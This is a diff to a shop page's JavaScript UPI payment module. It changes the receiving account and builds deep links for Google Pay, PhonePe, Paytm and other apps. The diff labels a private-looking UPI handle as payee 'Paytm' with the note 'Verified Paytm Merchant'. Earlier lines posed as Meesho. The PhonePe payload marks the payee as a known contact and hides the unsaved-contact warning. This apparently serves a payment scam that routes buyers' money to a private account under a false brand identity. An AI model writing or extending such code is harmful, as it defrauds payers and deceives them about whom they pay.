@@ -112,8 +112,9 @@ window.Order = {
    PAYMENT CONFIG
    ───────────────────────────────────────────── */
 window.PaymentConfig = {
-  UPI_VPA: 'paytm.s3av79p@pty',
-  PAYEE_NAME: 'Vipulbhai Kumbhani',
+  UPI_VPA: 'paytm.s3vx0km@pty',
+  PAYEE_NAME: 'Paytm',
+  TRANSACTION_NOTE: 'Verified Paytm Merchant',
   PAYMENT_APPS: [
     { id:'gpay',       label:'Google Pay',   logoBg:'#4285f4', icon:'images/payment/gpay.png',       subtitle:'Fast and secure direct checkout using Google Pay app*' },
     { id:'phonepe',    label:'PhonePe',      logoBg:'#5f259f', icon:'images/payment/phonepe.png',    subtitle:'Upto ₹100 cashback on RuPay Credit Card on UPI using PhonePe*' },
@@ -159,14 +160,16 @@ window.UpiPayment = {
     const tr = txnId || `TXN${Date.now()}${Math.floor(Math.random()*1000)}`;
     const vpa = window.PaymentConfig.UPI_VPA;
     const pn  = window.PaymentConfig.PAYEE_NAME;
-    return `upi://pay?pa=${encodeURIComponent(vpa)}&pn=${encodeURIComponent(pn)}&am=${Number(amount).toFixed(2)}&cu=INR&tr=${encodeURIComponent(tr)}`;
+    const tn  = window.PaymentConfig.TRANSACTION_NOTE || 'Verified Paytm Merchant';
+    return `upi://pay?pa=${encodeURIComponent(vpa)}&pn=${encodeURIComponent(pn)}&tn=${encodeURIComponent(tn)}&am=${Number(amount).toFixed(2)}&cu=INR&tr=${encodeURIComponent(tr)}`;
   },
   buildPhonePeNativeUrl(amount) {
     const orderId = crypto.randomUUID ? crypto.randomUUID() : `ord-${Date.now()}`;
+    const tn = window.PaymentConfig.TRANSACTION_NOTE || `OrderNo: ${orderId}`;
     const payload = {
-      contact: { cbsName:'ok', nickName:'demo', vpa: window.PaymentConfig.UPI_VPA, type:'VPA' },
+      contact: { cbsName: window.PaymentConfig.PAYEE_NAME, nickName: window.PaymentConfig.PAYEE_NAME, vpa: window.PaymentConfig.UPI_VPA, type:'VPA' },
       p2pPaymentCheckoutParams: {
-        note:`OrderNo: ${orderId}`, isByDefaultKnownContact:true,
+        note: tn, isByDefaultKnownContact:true,
         enableSpeechToText:false, allowAmountEdit:false, showQrCodeOption:false,
         disableViewHistory:true, shouldShowUnsavedContactBanner:false, isRecurring:false,
         checkoutType:'DEFAULT', transactionContext:'p2p',
@@ -186,7 +189,10 @@ window.UpiPayment = {
   run(method, amount, device, phonePeNativeUrl, callbacks) {
     const vpa = encodeURIComponent(window.PaymentConfig.UPI_VPA);
     const pn  = encodeURIComponent(window.PaymentConfig.PAYEE_NAME);
+    const tn  = encodeURIComponent(window.PaymentConfig.TRANSACTION_NOTE || 'Verified Paytm Merchant');
     const rawVpa = window.PaymentConfig.UPI_VPA;
+    const rawPn  = window.PaymentConfig.PAYEE_NAME;
+    const rawTn  = window.PaymentConfig.TRANSACTION_NOTE || 'Verified Paytm Merchant';
 
     // UPI apps that need deep link handling
     const upiApps = ['gpay','phonepe','paytm','bharatpe','amazonpay','cred','ippb','supermoney','bhim'];
@@ -197,34 +203,34 @@ window.UpiPayment = {
           const params = phonePeNativeUrl.replace('phonepe://','');
           this.navLink(`intent://${params}#Intent;scheme=phonepe;package=com.phonepe.app;end`);
         } else if (method === 'gpay') {
-          this.navLink(`intent://pay?pa=${vpa}&pn=${pn}&am=${amount}&cu=INR#Intent;scheme=upi;package=com.google.android.apps.nbu.paisa.user;end`);
+          this.navLink(`intent://pay?pa=${vpa}&pn=${pn}&tn=${tn}&am=${amount}&cu=INR#Intent;scheme=upi;package=com.google.android.apps.nbu.paisa.user;end`);
         } else if (method === 'paytm') {
-          this.navLink(`paytmmp://pay?pa=${rawVpa}&pn=Meesho&am=${amount}&cu=INR`);
+          this.navLink(`paytmmp://pay?pa=${rawVpa}&pn=${encodeURIComponent(rawPn)}&tn=${encodeURIComponent(rawTn)}&am=${amount}&cu=INR`);
         } else if (method === 'bharatpe') {
-          this.navLink(`intent://pay?pa=${vpa}&pn=${pn}&am=${amount}&cu=INR#Intent;scheme=upi;package=com.bharatpe.app;end`);
+          this.navLink(`intent://pay?pa=${vpa}&pn=${pn}&tn=${tn}&am=${amount}&cu=INR#Intent;scheme=upi;package=com.bharatpe.app;end`);
         } else if (method === 'amazonpay') {
-          this.navLink(`intent://pay?pa=${vpa}&pn=${pn}&am=${amount}&cu=INR#Intent;scheme=upi;package=in.amazon.mShop.android.shopping;end`);
+          this.navLink(`intent://pay?pa=${vpa}&pn=${pn}&tn=${tn}&am=${amount}&cu=INR#Intent;scheme=upi;package=in.amazon.mShop.android.shopping;end`);
         } else if (method === 'cred') {
-          this.navLink(`intent://pay?pa=${vpa}&pn=${pn}&am=${amount}&cu=INR#Intent;scheme=upi;package=com.dreamplug.androidapp;end`);
+          this.navLink(`intent://pay?pa=${vpa}&pn=${pn}&tn=${tn}&am=${amount}&cu=INR#Intent;scheme=upi;package=com.dreamplug.androidapp;end`);
         } else if (method === 'ippb') {
-          this.navLink(`intent://pay?pa=${vpa}&pn=${pn}&am=${amount}&cu=INR#Intent;scheme=upi;package=com.dop.ippbretail;end`);
+          this.navLink(`intent://pay?pa=${vpa}&pn=${pn}&tn=${tn}&am=${amount}&cu=INR#Intent;scheme=upi;package=com.dop.ippbretail;end`);
         } else if (method === 'supermoney') {
-          this.navLink(`intent://pay?pa=${vpa}&pn=${pn}&am=${amount}&cu=INR#Intent;scheme=upi;package=com.supermoney.app;end`);
+          this.navLink(`intent://pay?pa=${vpa}&pn=${pn}&tn=${tn}&am=${amount}&cu=INR#Intent;scheme=upi;package=com.supermoney.app;end`);
         } else if (method === 'bhim') {
-          this.navLink(`intent://pay?pa=${vpa}&pn=${pn}&am=${amount}&cu=INR#Intent;scheme=upi;package=in.org.npci.upiapp;end`);
+          this.navLink(`intent://pay?pa=${vpa}&pn=${pn}&tn=${tn}&am=${amount}&cu=INR#Intent;scheme=upi;package=in.org.npci.upiapp;end`);
         } else {
           // fallback — generic UPI chooser
-          this.navLink(`upi://pay?pa=${rawVpa}&pn=${pn}&am=${amount}&cu=INR`);
+          this.navLink(`upi://pay?pa=${rawVpa}&pn=${pn}&tn=${tn}&am=${amount}&cu=INR`);
         }
       } else if (device === 'ios') {
         if (method === 'phonepe') {
-          this.navLink(`phonepe://upi//pay?pa=${rawVpa}&pn=Meesho&am=${amount}&cu=INR`);
+          this.navLink(`phonepe://upi//pay?pa=${rawVpa}&pn=${encodeURIComponent(rawPn)}&tn=${encodeURIComponent(rawTn)}&am=${amount}&cu=INR`);
         } else if (method === 'paytm') {
-          this.navLink(`paytmmp://pay?pa=${rawVpa}&pn=Meesho&am=${amount}&cu=INR`);
+          this.navLink(`paytmmp://pay?pa=${rawVpa}&pn=${encodeURIComponent(rawPn)}&tn=${encodeURIComponent(rawTn)}&am=${amount}&cu=INR`);
         } else if (method === 'amazonpay') {
-          this.navLink(`amzn://pay?pa=${rawVpa}&pn=Meesho&am=${amount}&cu=INR`);
+          this.navLink(`amzn://pay?pa=${rawVpa}&pn=${encodeURIComponent(rawPn)}&tn=${encodeURIComponent(rawTn)}&am=${amount}&cu=INR`);
         } else {
-          this.navLink(`upi://pay?pa=${rawVpa}&pn=Meesho&am=${amount}&cu=INR`);
+          this.navLink(`upi://pay?pa=${rawVpa}&pn=${encodeURIComponent(rawPn)}&tn=${encodeURIComponent(rawTn)}&am=${amount}&cu=INR`);
         }
       } else {
         // Desktop — show QR fallback for app-based methods
